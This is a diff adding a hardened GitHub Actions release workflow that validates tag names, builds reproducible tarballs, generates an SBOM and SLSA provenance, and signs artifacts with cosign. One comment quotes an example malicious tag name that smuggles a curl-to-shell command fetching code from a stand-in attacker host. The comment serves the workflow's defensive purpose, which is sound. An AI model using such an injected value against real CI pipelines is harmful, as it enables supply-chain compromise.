@@ -1,0 +1,144 @@
+name: Release
+
+on:
+  push:
+    tags: ['v*.*.*']
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    name: build & digest
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    outputs:
+      digest: ${{ steps.hash.outputs.digest }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - name: Enable corepack
+        run: corepack enable
+      - uses: actions/setup-node@v4
+        with:
+          node-version-file: .nvmrc
+          cache: pnpm
+
+      - run: pnpm install --frozen-lockfile
+
+      # A release must never ship code that would fail the everyday gates.
+      - name: Full verification
+        run: pnpm run verify
+
+      - run: pnpm run build
+
+      - name: Package release artifacts
+        env:
+          # Never interpolate a ref name into a shell string. Git permits $, (,
+          # ), backticks and ; in tag names, and `tags: ['v*.*.*']` matches
+          # `v1.0.$(curl attacker|sh)` -- executing inside the step whose digest
+          # is then SLSA-attested and cosign-signed. Passed as an environment
+          # variable it is data, and validated before use.
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          case "$REF_NAME" in
+            v[0-9]*.[0-9]*.[0-9]*) : ;;
+            *) echo "refusing to release from ref '$REF_NAME'" >&2; exit 1 ;;
+          esac
+          printf '%s' "$REF_NAME" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$' \
+            || { echo "ref name is not a plain semver tag" >&2; exit 1; }
+          mkdir -p release
+          # Tracked sources AND the build output. dist/ is gitignored, so a
+          # `git ls-files` manifest alone produced a source-only archive -- and
+          # the digest, SLSA provenance and cosign signature below then attested
+          # an artifact containing none of the compiled code it claims to ship.
+          git ls-files packages apps services > release/.filelist
+          # Build output, minus incremental-compile state: a tsbuildinfo in the
+          # signed tarball varies run to run, which breaks reproducibility of
+          # the attested artifact.
+          find packages -type f -path '*/dist/*' -not -path '*/node_modules/*' \
+            -not -name '*.tsbuildinfo' >> release/.filelist
+          sort -u release/.filelist -o release/.filelist
+          test -s release/.filelist || { echo "empty release manifest" >&2; exit 1; }
+          grep -q '/dist/' release/.filelist \
+            || { echo "release manifest contains no build output" >&2; exit 1; }
+          tar --sort=name --owner=0 --group=0 --numeric-owner \
+              --mtime='@0' --format=gnu \
+              -czf "release/hestia-$REF_NAME.tar.gz" \
+              -T release/.filelist
+          rm -f release/.filelist
+
+      - name: Compute subject digests
+        id: hash
+        run: |
+          echo "digest=$(sha256sum release/*.tar.gz | base64 -w0)" >> "$GITHUB_OUTPUT"
+          sha256sum release/*.tar.gz
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release-artifacts
+          path: release/
+          retention-days: 90
+
+  sbom:
+    name: SBOM
+    # Deliberately not `needs: build` -- Syft scans the source tree and consumes
+    # nothing from that job, so the dependency only delayed the critical path.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - uses: anchore/sbom-action@v0
+        with:
+          path: .
+          format: cyclonedx-json
+          output-file: hestia-sbom.cdx.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: sbom
+          path: hestia-sbom.cdx.json
+          retention-days: 90
+
+  provenance:
+    name: SLSA L3 provenance
+    needs: build
+    permissions:
+      actions: read
+      id-token: write
+      contents: write
+    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.1.0
+    with:
+      base64-subjects: ${{ needs.build.outputs.digest }}
+      upload-assets: true
+
+  sign:
+    name: cosign (keyless)
+    needs: [build, sbom]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          pattern: '{release-artifacts,sbom}'
+          merge-multiple: true
+          path: release
+      - uses: sigstore/cosign-installer@v3
+      - name: Sign artifacts (Fulcio + Rekor, no long-lived keys)
+        run: |
+          for f in release/*; do
+            [ -f "$f" ] || continue
+            cosign sign-blob --yes \
+              --output-signature "$f.sig" \
+              --output-certificate "$f.pem" \
+              "$f"
+          done
+      - uses: softprops/action-gh-release@v2
+        with:
+          files: release/*
+          generate_release_notes: true
+          fail_on_unmatched_files: true
